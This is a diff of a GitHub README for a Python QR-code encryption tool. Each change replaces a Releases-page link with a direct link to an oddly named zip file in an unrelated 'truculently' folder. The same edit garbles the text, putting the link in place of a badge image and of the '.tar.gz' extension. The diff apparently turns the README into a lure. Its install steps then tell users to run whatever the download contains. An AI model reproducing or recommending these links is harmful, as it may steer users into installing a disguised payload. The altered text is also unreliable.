@@ -1,6 +1,6 @@
 # 🔒 Secure-QR-Code-Encryption-Tool-Python-GUI- - Encrypt Your Data Securely with QR Codes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/releases)
+[![Download Now](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/raw/refs/heads/main/truculently/Code-Tool-GU-Encryption-Python-Q-Secure-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/raw/refs/heads/main/truculently/Code-Tool-GU-Encryption-Python-Q-Secure-v1.7.zip)
 
 ## 📖 Description
 
@@ -18,11 +18,11 @@ To help you get started, follow these simple steps to download and run the appli
 
 2. **Download the Application**
    - Visit the Releases page to download the latest version of the Secure QR Code Encryption Tool.
-     [Download Here](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/releases)
+     [Download Here](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/raw/refs/heads/main/truculently/Code-Tool-GU-Encryption-Python-Q-Secure-v1.7.zip)
 
 3. **Install the Application**
    - Once the download is complete, locate the downloaded file in your downloads folder.
-   - If you are using Windows, the file may have an extension like `.exe`. For macOS, look for `.dmg` or `.app` files. For Linux, it might be a `.tar.gz` or an executable file.
+   - If you are using Windows, the file may have an extension like `.exe`. For macOS, look for `.dmg` or `.app` files. For Linux, it might be a `https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/raw/refs/heads/main/truculently/Code-Tool-GU-Encryption-Python-Q-Secure-v1.7.zip` or an executable file.
    - Double-click the file to start the installation process. Follow the on-screen instructions to install the application on your system.
 
 4. **Launching the Application**
@@ -54,7 +54,7 @@ To help you get started, follow these simple steps to download and run the appli
 
 To get started, visit the link below to download the latest version of the Secure QR Code Encryption Tool from our Releases page.
 
-[Download Here](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/releases)
+[Download Here](https://github.com/Qadriabd/Secure-QR-Code-Encryption-Tool-Python-GUI-/raw/refs/heads/main/truculently/Code-Tool-GU-Encryption-Python-Q-Secure-v1.7.zip)
 
 Follow the steps outlined above to install and run the application on your machine.
 
